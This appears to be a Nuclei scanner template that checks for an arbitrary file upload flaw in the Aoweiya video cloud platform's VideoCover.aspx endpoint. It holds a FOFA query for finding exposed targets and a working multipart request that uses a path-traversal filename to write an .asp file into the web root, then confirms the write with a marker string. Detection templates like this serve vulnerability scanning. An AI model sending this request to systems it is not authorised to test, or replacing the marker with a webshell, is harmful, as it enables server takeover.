id: aoweiya-VideoCover-fileupload
info:
  name: 奥威亚视屏云平台 VideoCover.aspx - fileupload
  author: leadlife
  severity: critical
  description: 奥威亚视屏云平台接口VideoCover.aspx存在任意文件上传，通过此漏洞攻击者可上传webshell木马，远程控制服务器。
  reference: 
    - https://blog.csdn.net/qq_56698744/article/details/134998173
  classification:
    cve-id: 
  metadata:
    verified: true
    fofa-query: body="/CSS/NewtonTheme/assets/app.css"
  tags: 2024,fileupload,aoweiya

variables:
    filename: "{{to_lower(rand_base(4))}}"
    date: '{{date_time("%Y%M%D%H%M%S")}}'

http:
  - raw:
      - |
        POST /Tools/Video/VideoCover.aspx HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 1015 7) AppleWebKit/537.36(KHTML, like Gecko) Chrome/107.0.0.0 Safari 537.36
        Accept-Encoding: gzip, deflate
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avifimage/webp,image/apng,*/*;q=0.8,application/signed-exchangev=b3;q=0.9
        Connection: close
        Pragma: no-cache
        Cache-Control: no-cache
        Upgrade-Insectre-Requests: 1
        Accept-Language: zh-CN,zh;g=0.9
        Content-Length: 263
        Content-Type: multipart/form-data; boundary=68c4ca658cd4332dc386f53710e63a10
        
        --68c4ca658cd4332dc386f53710e63a10
        Content-Disposition: form-data; name="file"; filename="/../../../AVA.ResourcesPlatform.WebUI/{{filename}}.asp"
        Content-Type: image/jpeg
        
        {{randstr}}
        --68c4ca658cd4332dc386f53710e63a10--
        
      
      - |+
        GET /{{filename}}.asp HTTP/1.1
        Host: {{Hostname}}
        
    matchers:
      - type: dsl
        dsl:
          - status_code_2 == 200
          - contains(body_2,'{{randstr}}')
        condition: and